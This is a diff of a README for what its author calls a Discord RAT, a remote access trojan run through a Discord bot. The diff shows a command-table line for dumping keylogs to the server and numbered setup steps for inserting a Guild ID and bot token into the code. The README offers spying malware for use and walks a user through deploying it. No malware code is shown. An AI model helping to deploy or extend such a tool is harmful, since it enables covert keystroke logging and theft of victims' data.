@@ -23,7 +23,8 @@ This is my first repositorie, and its a discord rat lol
 | !dumpkeyloger | sends the keylogs to the server |
 
 # How to set the rat up?
-goto line 8 and paste in `guild_id = "Here-your-Guild-ID"` your Guild ID
-goto line 145 and paste in `client.run('Here-the-Bot-Token')` your Bot Token
+1. goto line 8 and paste in `guild_id = "Here-your-Guild-ID"` your Guild ID
+1. goto line 145 and paste in `client.run('Here-the-Bot-Token')` your Bot Token
 
 ---------------------------------------------------------------------------------------
+## If you have improvements, questions or so you can create a issue or dm me on Discord .l133
